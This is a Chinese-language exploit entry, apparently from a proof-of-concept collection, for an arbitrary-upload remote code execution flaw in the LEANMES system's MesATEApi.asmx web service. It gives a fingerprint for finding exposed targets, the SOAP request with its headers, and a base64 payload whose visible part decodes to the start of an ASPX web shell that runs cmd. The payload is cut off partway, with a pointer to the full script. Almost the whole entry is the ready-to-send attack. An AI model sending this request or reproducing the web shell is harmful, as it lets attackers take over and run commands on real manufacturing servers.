# 深科特LEANMES系统MesATEApi.asmx存在任意上传致RCE漏洞

- **系统**：深科特LEANMES系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /WebService/MesATEApi.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://mesateapi.com/UploadFileToMES"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<UploadFileToMES xmlns="http://mesateapi.com/">
<empNo>string</empNo>
<sn>string</sn>
<resource>string</resource>
<station>string</station>
<fileBytes>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5T…（脚本共 1252 字，完整版见原文）
```
- **预期**：200　|　—